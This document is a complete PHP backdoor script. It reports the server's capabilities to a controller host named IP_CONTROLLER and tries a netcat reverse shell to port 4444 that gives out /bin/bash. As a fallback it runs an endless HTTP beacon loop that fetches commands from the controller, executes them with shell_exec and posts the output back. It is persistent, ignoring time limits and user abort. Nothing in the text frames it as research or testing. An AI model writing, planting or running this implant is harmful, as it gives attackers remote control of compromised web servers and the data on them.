<?php
set_time_limit(0);
ignore_user_abort(true);

/* ================= CONFIG ================= */
$CTRL_HTTP = "http://IP_CONTROLLER:8080";
$CTRL_IP   = "IP_CONTROLLER";
$NC_PORT   = 4444;
$INTERVAL  = 5;

/* ================= DIAG ================= */
$cap = [
    "exec" => function_exists("exec"),
    "shell_exec" => function_exists("shell_exec"),
    "nc" => false,
    "out_tcp" => false
];

if ($cap["shell_exec"]) {
    $cap["nc"] = trim(shell_exec("command -v nc 2>/dev/null")) !== "";
}

$fp = @fsockopen("8.8.8.8", 53, $e, $s, 5);
if ($fp) {
    $cap["out_tcp"] = true;
    fclose($fp);
}

/* ================= SEND CAPABILITY ================= */
@file_get_contents(
    $CTRL_HTTP . "/cap",
    false,
    stream_context_create([
        "http" => [
            "method" => "POST",
            "content" => json_encode($cap),
            "header" => "Content-Type: application/json"
        ]
    ])
);

/* ================= TRY NETCAT ================= */
if ($cap["exec"] && $cap["nc"] && $cap["out_tcp"]) {
    $cmd = "nc $CTRL_IP $NC_PORT -e /bin/bash";
    exec($cmd . " >/dev/null 2>&1 &");
}

/* ================= FALLBACK: HTTP BEACON ================= */
while (true) {
    $cmd = @file_get_contents($CTRL_HTTP . "/task");
    if ($cmd) {
        $out = shell_exec($cmd . " 2>&1");
        @file_get_contents(
            $CTRL_HTTP . "/result",
            false,
            stream_context_create([
                "http" => [
                    "method" => "POST",
                    "content" => $out ?: "(no output)",
                    "header" => "Content-Type: text/plain"
                ]
            ])
        );
    }
    sleep($INTERVAL);
}
